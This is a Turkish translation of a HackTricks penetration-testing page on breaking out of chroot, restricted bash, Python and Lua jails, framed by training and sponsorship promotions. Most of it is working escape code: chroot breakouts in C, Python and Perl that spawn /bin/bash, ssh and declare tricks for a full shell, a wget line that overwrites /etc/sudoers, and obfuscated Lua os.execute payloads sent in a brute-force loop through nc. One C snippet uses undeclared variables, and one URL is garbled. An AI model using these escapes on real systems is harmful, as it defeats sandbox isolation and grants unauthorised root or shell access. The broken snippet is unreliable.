# Hapishaneden Kaçış

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## **GTFOBins**

**"Shell" özelliğine sahip herhangi bir binary'i çalıştırabilir misiniz diye** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **adresinde arama yapın**

## Chroot Kaçışları

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)'dan: Chroot mekanizması, **açık** (**root**) **kullanıcılar** tarafından **kasıtlı müdahalelere karşı korunmak amacıyla tasarlanmamıştır**. Çoğu sistemde, chroot bağlamları düzgün bir şekilde yığılmaz ve yeterli ayrıcalıklara sahip chrooted programlar **kırılmak için ikinci bir chroot gerçekleştirebilir**.\
Genellikle bu, kaçmak için chroot içinde root olmanız gerektiği anlamına gelir.

{% hint style="success" %}
**Araç** [**chw00t**](https://github.com/earthquake/chw00t) aşağıdaki senaryoları kötüye kullanmak ve `chroot`tan kaçmak için oluşturulmuştur.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Eğer bir chroot içinde **root** iseniz, **başka bir chroot oluşturarak kaçabilirsiniz**. Bu, 2 chroot'un aynı anda var olamayacağı anlamına gelir (Linux'ta), bu yüzden yeni bir klasör oluşturursanız ve ardından **bu yeni klasörde yeni bir chroot oluşturursanız ve siz dışında kalırsanız**, artık **yeni chroot'un dışında olacaksınız** ve dolayısıyla FS içinde olacaksınız.

Bu genellikle chroot'un çalışma dizinini belirtilene taşımaz, bu yüzden bir chroot oluşturabilirsiniz ancak dışında kalabilirsiniz.
{% endhint %}

Genellikle bir chroot hapishanesi içinde `chroot` binary'sini bulamazsınız, ancak bir binary derleyip yükleyip çalıştırabilirsiniz:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Kaydedilen fd

{% hint style="warning" %}
Bu, önceki duruma benzer, ancak bu durumda **saldırgan mevcut dizine bir dosya tanımlayıcısı kaydeder** ve ardından **yeni bir klasörde chroot oluşturur**. Son olarak, chroot dışında **FD'ye erişimi olduğundan**, buna erişir ve **kaçar**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD, Unix Domain Sockets üzerinden iletilir, bu yüzden:

* Bir çocuk işlem oluştur (fork)
* Parent ve çocuğun iletişim kurabilmesi için UDS oluştur
* Çocuk işlemin farklı bir klasörde chroot çalıştır
* Parent işlemde, yeni çocuk işlem chroot'unun dışında olan bir klasörün FD'sini oluştur
* UDS kullanarak o FD'yi çocuk işleme ilet
* Çocuk işlem o FD'ye chdir yapar ve chroot'un dışında olduğu için hapisten kaçar
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Root cihazını (/) chroot içindeki bir dizine bağlama
* Bu dizine chroot yapma

Bu Linux'ta mümkündür
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Procfs'i chroot içindeki bir dizine bağla (henüz bağlı değilse)
* Farklı bir root/cwd girişi olan bir pid ara, örneğin: /proc/1/root
* Bu girişe chroot yap
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Bir Fork (çocuk işlem) oluştur ve FS içinde daha derin bir klasöre chroot yap ve ona CD yap
* Parent işleminden, çocuk işleminin bulunduğu klasörü, çocukların chroot'unun öncesindeki bir klasöre taşı
* Bu çocuk işlem, kendisini chroot'un dışında bulacaktır
{% endhint %}

### ptrace

{% hint style="warning" %}
* Kullanıcılar zamanında kendi işlemlerini kendi işlemlerinden hata ayıklayabilirdi... ancak artık varsayılan olarak bu mümkün değil
* Yine de, mümkünse, bir işleme ptrace yapabilir ve içinde bir shellcode çalıştırabilirsiniz ([bu örneğe bakın](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Hapishaneleri

### Numaralandırma

Hapishane hakkında bilgi al:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH Değiştirme

PATH ortam değişkenini değiştirip değiştiremediğinizi kontrol edin
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim Kullanarak
```bash
:set shell=/bin/sh
:shell
```
### Betik oluştur

Eğer içeriği _/bin/bash_ olan yürütülebilir bir dosya oluşturabilir misiniz kontrol edin.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH üzerinden bash alın

Eğer ssh üzerinden erişiyorsanız, bir bash kabuğunu yürütmek için bu hileyi kullanabilirsiniz:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Tanımla
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Örneğin sudoers dosyasını üzerine yazabilirsiniz
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Diğer hileler

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Ayrıca ilginç olabilecek sayfa:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Hapishaneleri

Python hapishanelerinden kaçma hakkında hileler aşağıdaki sayfada bulunabilir:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Hapishaneleri

Bu sayfada lua içinde erişebileceğiniz global fonksiyonları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Komut yürütme ile değerlendirme:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Bir kütüphanenin fonksiyonlarını **noktalar kullanmadan çağırmak için bazı hileler**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Belirli bir kütüphanenin fonksiyonlarını sırala:
```bash
for k,v in pairs(string) do print(k,v) end
```
Her seferinde önceki tek satırlığı **farklı bir lua ortamında çalıştırdığınızda fonksiyonların sırası değişir**. Dolayısıyla belirli bir fonksiyonu çalıştırmanız gerekiyorsa, farklı lua ortamlarını yükleyerek ve le kütüphanesinin ilk fonksiyonunu çağırarak brute force saldırısı gerçekleştirebilirsiniz:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Etkileşimli lua kabuğu alın**: Eğer sınırlı bir lua kabuğu içindeyseniz, aşağıdaki komutu kullanarak yeni bir lua kabuğu alabilirsiniz (ve umarım sınırsız olur):
```bash
debug.debug()
```
## Referanslar

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slaytlar: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
